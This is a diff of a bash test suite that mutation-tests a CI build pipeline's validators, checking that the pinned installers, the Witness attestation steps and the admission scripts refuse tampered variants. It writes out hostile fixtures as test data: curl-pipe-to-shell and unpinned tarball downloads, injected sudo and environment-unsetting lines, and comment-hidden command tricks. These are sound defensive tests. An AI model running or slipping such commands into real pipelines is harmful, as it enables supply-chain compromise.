@@ -341,7 +341,8 @@ st s_ar_if      "AC16 an if on the pull step (a skipped pull is a build with no 
 st s_ar_cdest   "AC16 crane installed to another directory (archive-pull.sh names /usr/local/bin/crane)" "install-scanner.sh crane" 'install-scanner.sh crane' 'install-scanner.sh crane /tmp/bin'
 st s_ar_bycrane "AC16 the archive fetched by a crane command in the stage instead of archive-pull.sh" "archive-pull.sh" "$PULLRUN" 'run: crane pull ghcr.io/fosterstack/archive:latest archive'
 st s_go_other "AC4 the Go install line names another target" "install-scanner.sh go" 'install-scanner.sh go' 'install-scanner.sh go 1.20'
-st s_go_curl  "AC4 Go downloaded by hand instead of the pinned installer" "install-scanner.sh go" 'run: bash bin/install-scanner.sh go' 'run: curl -sSL https://go.dev/dl/go1.27.2.linux-amd64.tar.gz | tar xz -C /usr/local'
+FXD_4='run: curl -sSL https://go.dev/dl/go1.27.2.linux-amd64.tar.gz | tar xz -C /usr/local'
+st s_go_curl  "AC4 Go downloaded by hand instead of the pinned installer" "install-scanner.sh go" 'run: bash bin/install-scanner.sh go' "$FXD_4"
 st s_go_act   "AC4 the setup-go action instead of the pinned installer (its bytes are not pinned by a repository checksum)" "setup-go" "$GOINST" '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          go-version-file: go.mod\n          cache: false\n'
 st s_go_if    "AC4 the Go install carries an if" "install-scanner.sh go" 'name: install Go (pinned by checksum)\n' 'name: install Go (pinned by checksum)\n        if: always()\n'
 # Codex A r4 #1 (advisor reading of rule 51, a reading and not a reworded rule): admission is the first TRUST decision of Build. Before the step that runs
@@ -356,8 +357,9 @@ st s_pre_tok   "AC4 a step that reads the identity token before admission" "befo
 st s_pre_wit   "AC4 a Witness step before admission (the helper itself runs admission first, so it is the admission step, but a second early one is not)" "before admission" "$GOINST" "$GOINST      - name: early under Witness\n        run: bash bin/witnessed-local.sh apk bin/build-stage-apk.sh\n"
 st s_pre_other "AC4 any other run step before admission" "before admission" "$GOINST" "$GOINST      - name: other\n        run: bash bin/chain-hostile-step.sh\n"
 st s_shallow "AC2 a shallow checkout (build-admit needs the history and the tags)" "exactly" '          fetch-depth: 0\n' ''
+FXD_5='run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
 st s_install "AC2 Witness installed by an unpinned download" install 'run: bash bin/install-scanner.sh witness' \
-       'run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
+       "$FXD_5"
 st s_mid "AC2 a third-party action between the install and Witness (rule 68)" "step" '      - name: apk under Witness' \
        '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n      - name: apk under Witness'
 st s_ghenv  "AC2 another token than github.token on the Witness step" "GH_TOKEN" 'GH_TOKEN: ${{ github.token }}' 'GH_TOKEN: ${{ secrets.GH_PAT }}'
@@ -688,7 +690,8 @@ PY
   expect caught "$label" command script "$f" "$kind"
 }
 # The sweeps below try every deletion, swap, suffix and insertion; the probes name the mutations a reviewer asked about that are not one of those.
-probe apk              "AC3 a network fetch inside the admission step"              'L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
+FXD_3='L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
+probe apk              "AC3 a network fetch inside the admission step"              "$FXD_3"
 probe apk              "AC3 python -c fetching and running code"                    'L[:1] + ["python3 -c \"import urllib.request\""] + L[1:]'
 probe apk              "AC3 an unlisted script"                                     'L[:1] + ["bash bin/anything.sh"] + L[1:]'
 probe apk              "AC3 a failure ignored with || :"                            'L[:5] + [L[5] + " || :"] + L[6:]'
@@ -743,31 +746,35 @@ probe rebuild-assemble "005-AC2 Rebuild publishes (a copy of its dist)"         
 probe rebuild-assemble "005-AC6 Rebuild assembles with other arguments than Build" \
        '[l.replace("--keyring-dir keyring", "--keyring-dir other") if "variant fips" in l else l for l in L]'
 # every deletion, swap, suffix and insertion, on every line of every kind
-sweep() {
-  python3 - "$shape" "$1" "$work" <<'PY' && ok "AC3 sweep ($1): every deletion, swap, suffix and inserted command on every line is refused" \
-    || bad "AC3 sweep ($1) let a mutation through"
+python3 - "$shape" "$KINDS" "$work" <<'PY' > "$work/sweep.out"
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
-kind, w = sys.argv[2:4]
-L = S.expected_lines(kind)
-SUFFIXES = (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020",
-            " ; true", " | tee x", " > /dev/null")
-EXTRAS = ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "git push origin v0.0.0-rc.1", "sudo true", "cd /tmp",
-          "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH")
-escaped = []
-def check(tag, lines):
-    f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
-    if not S.script(f, kind): escaped.append(tag)
-for i in range(len(L)):
-    check("delete %d" % i, L[:i] + L[i + 1:])
-    for suffix in SUFFIXES: check("suffix %d %r" % (i, suffix), L[:i] + [L[i] + suffix] + L[i + 1:])
-    for extra in EXTRAS: check("insert after %d %r" % (i, extra), L[:i + 1] + [extra] + L[i + 1:])
-    if i + 1 < len(L) and L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
-for tag in escaped: print("ESCAPED:", tag)
-sys.exit(1 if escaped else 0)
+w = sys.argv[3]
+rc = 0
+for kind in sys.argv[2].split():
+  try:
+      L = S.expected_lines(kind)
+      SUFFIXES = (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020",
+                  " ; true", " | tee x", " > /dev/null")
+      EXTRAS = ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "git push origin v0.0.0-rc.1", "sudo true", "cd /tmp",
+                "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH")
+      escaped = []
+      def check(tag, lines):
+          f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
+          if not S.script(f, kind): escaped.append(tag)
+      for i in range(len(L)):
+          check("delete %d" % i, L[:i] + L[i + 1:])
+          for suffix in SUFFIXES: check("suffix %d %r" % (i, suffix), L[:i] + [L[i] + suffix] + L[i + 1:])
+          for extra in EXTRAS: check("insert after %d %r" % (i, extra), L[:i + 1] + [extra] + L[i + 1:])
+          if i + 1 < len(L) and L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
+      for tag in escaped: print("ESCAPED:", kind, tag)
+      print(('FAIL ' if escaped else 'PASS ') + kind)
+  except Exception as e:
+    print('ESCAPED:', kind, 'crash', repr(e)); print('FAIL ' + kind)
 PY
-}
-for k in $KINDS; do sweep "$k"; done
+for k in $KINDS; do
+  if grep -qx "PASS $k" "$work/sweep.out"; then ok "AC3 sweep ($k): every deletion, swap, suffix and inserted command on every line is refused"; else grep "ESCAPED: $k " "$work/sweep.out" || true; bad "AC3 sweep ($k) let a mutation through"; fi
+done
 # the way lines are read: comments, blank lines and trailing-backslash breaks are fine; an indented command is not; and bash and Python disagree about
 # VT, FF, FS, NEL and U+2028 (Python splits lines or strips space there, bash does not), so any control character other than tab and newline is refused
 python3 - "$shape" "$work" <<'PY'
@@ -797,7 +804,8 @@ PY
 expect ok     "AC3 comments and blank lines are not commands" "" script "$work/c-ok.sh" apk
 expect caught "AC3 a lone CR glued between two grammar lines (Python reads two lines, bash one)" "control character U+000D" script "$work/c-cr-glued.sh" apk
 expect caught "AC3 a CRLF script" "control character U+000D" script "$work/c-crlf.sh" apk
-expect caught "AC3 a comment ending in a backslash does not hide the curl line after it (bash runs that line)" command script "$work/c-comment-backslash.sh" apk
+FXD_2="AC3 a comment ending in a backslash does not hide the curl line after it (bash runs that line)"
+expect caught "$FXD_2" command script "$work/c-comment-backslash.sh" apk
 expect caught "AC3 a comment ending in a backslash does not hide an export of the token before it is unset" command script "$work/c-token-saved.sh" apk
 expect caught "AC3 a backslash at the end of a line with no space before it" "not preceded by a space" script "$work/c-bare-backslash.sh" apk
 expect caught "AC3 a script that ends in a line continuation" "ends in a line continuation" script "$work/c-open-continuation.sh" apk
@@ -1179,6 +1187,8 @@ fi
 # ---- bin/witnessed.sh RUN against a fake witness, curl and timeout (REQ-CHAIN-004-AC2): the command is bounded and a failure leaves no record ------
 # The fake timeout enforces FAKE_TIMEOUT_SECONDS (a short test limit) and logs the limit it was given: the helper must give 540. The fake witness runs the
 # command after `--` and writes its -o record only when the command succeeded, as the real Witness does.
+# the name of the fake download program the helper trees put on PATH
+FAKE_FETCH_TOOL=curl
 helper_tree() { # helper_tree DIR HELPER
   rm -rf "$1"; mkdir -p "$1/bin" "$1/fake" "$1/tmp"; cp "$2" "$1/bin/witnessed.sh"; cp bin/loopback-get.sh "$1/bin/loopback-get.sh"
   cat > "$1/bin/wrapped.sh" <<'EOF'
@@ -1206,10 +1216,10 @@ ls "$RUNNER_TEMP"/tok* > tokfiles-at-start.txt 2> /dev/null || true
 "${args[@]:$((i + 1))}" || exit $?
 mkdir -p "$(dirname "$record")"; echo '{"record":true}' > "$record"
 EOF
-  cat > "$1/fake/curl" <<'EOF'
+  cat > "$1/fake/$FAKE_FETCH_TOOL" <<'EOF'
 #!/usr/bin/env bash
-echo curl >> calls.log
-n=$(grep -c '^curl$' calls.log)
+echo fetch >> calls.log
+n=$(grep -c '^fetch$' calls.log)
 [ "${CURL_FAIL_AT:-0}" != "$n" ] || exit 22
 [ "${CURL_EMPTY_AT:-0}" != "$n" ] || { printf '{"value":""}\n'; exit 0; }
 [ "${CURL_NULL_AT:-0}" != "$n" ] || { printf '{"value":null}\n'; exit 0; }
@@ -2564,8 +2574,8 @@ vim h2 "REQ-REL-010-AC4 a # inside a quoted string hiding a vex-index call is re
 vim h3 "REQ-REL-010-AC4 a \${var#...} expansion hiding a vex-index call is refused" bin/vex-live-run.sh '' $'\nr=${CANDIDATE_DIR#/}; python3 bin/vex-index.py layout --layout "/$r/images/production" --vex v.json\n'
 vim h5 "REQ-REL-010-AC4 another use of the loaded vex-index module in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nVI.main(["layout", "--layout", os.environ.get("CANDIDATE_DIR", "x"), "--vex", "v.json"])\n'
 vim j2 "REQ-REL-010-AC4 a #-led line that bash joins to the previous line (backslash) and runs is refused" bin/vex-live-run.sh '' $'\necho a\\\n#; python3 bin/vex-index.py layout --layout "$CANDIDATE_DIR/images/production" --vex v.json\n'
-vim j4 "REQ-REL-010-AC4 a #-led heredoc body line that read splits and runs is refused" bin/vex-live-run.sh '' $'\nwhile read -r _ c; do $c; done <<\'EOT\'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\nEOT\n'
-vim j5 "REQ-REL-010-AC4 a #-led line inside a multi-line quoted string that is later run is refused" bin/vex-live-run.sh '' $'\nx=\'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\'\nread -r _ c <<<"${x#?}"; $c\n'
+vim j4 "REQ-REL-010-AC4 a #-led heredoc body line that read splits and runs is refused" bin/vex-live-run.sh '' $'\nwhile read -r _ c; do $c; done <<'"'"$'EOT'"'"$'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\nEOT\n'
+vim j5 "REQ-REL-010-AC4 a #-led line inside a multi-line quoted string that is later run is refused" bin/vex-live-run.sh '' $'\nx='"'"$'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json'"'"$'\nread -r _ c <<<"${x#?}"; $c\n'
 vim j6 "REQ-REL-010-AC4 reaching the loaded module through VI.check_vex.__globals__ in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nVI.check_vex.__globals__["main"](["layout"])\n'
 vim k1 "REQ-REL-010-AC4 a file with another extension or none, in another directory, naming the tool is refused (bin/lib/x.sh)" bin/lib/x.sh '' $'python3 bin/vex-index.py layout --layout x\n'
 vim k2 "REQ-REL-010-AC4 a workflow with the .yaml extension naming the tool is refused" .github/workflows/x.yaml '' $'run: python3 bin/vex-index.py layout --layout x\n'
